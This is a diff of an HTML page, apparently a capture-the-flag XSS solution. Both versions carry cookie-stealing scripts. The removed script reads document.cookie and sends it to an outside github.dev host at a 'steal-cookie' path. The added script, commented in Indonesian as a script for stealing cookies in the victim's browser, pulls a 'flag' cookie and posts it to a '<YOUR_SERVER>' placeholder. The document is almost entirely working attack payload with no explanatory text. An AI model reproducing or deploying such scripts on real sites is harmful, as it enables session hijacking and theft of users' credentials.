@@ -1,12 +1,31 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>XSS Challenge</title>
+    <meta charset="UTF-8">
+    <title>XSS Test</title>
+    <script>
+        // Skrip XSS untuk mencuri cookie
+        fetch('http://<YOUR_SERVER>/report/', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ url: 'http://example.com/xss.html' })
+        }).then(response => response.json())
+          .then(data => {
+              if (data.success) {
+                  // Skrip ini akan dijalankan di browser korban
+                  const flag = document.cookie.match(/flag=([^;]+)/);
+                  if (flag) {
+                      fetch('http://<YOUR_SERVER>/report/', {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({ url: 'http://example.com/storeflag?flag=' + flag[1] })
+                      });
+                  }
+              }
+          });
+    </script>
 </head>
 <body>
-    <script>
-        const cookie = document.cookie;
-        fetch('https://opulent-space-disco-pqvq4vrg6x43wgj-3000.app.github.dev/steal-cookie?cookie=' + encodeURIComponent(cookie));
-    </script>
+    <h1>XSS Test</h1>
 </body>
 </html>
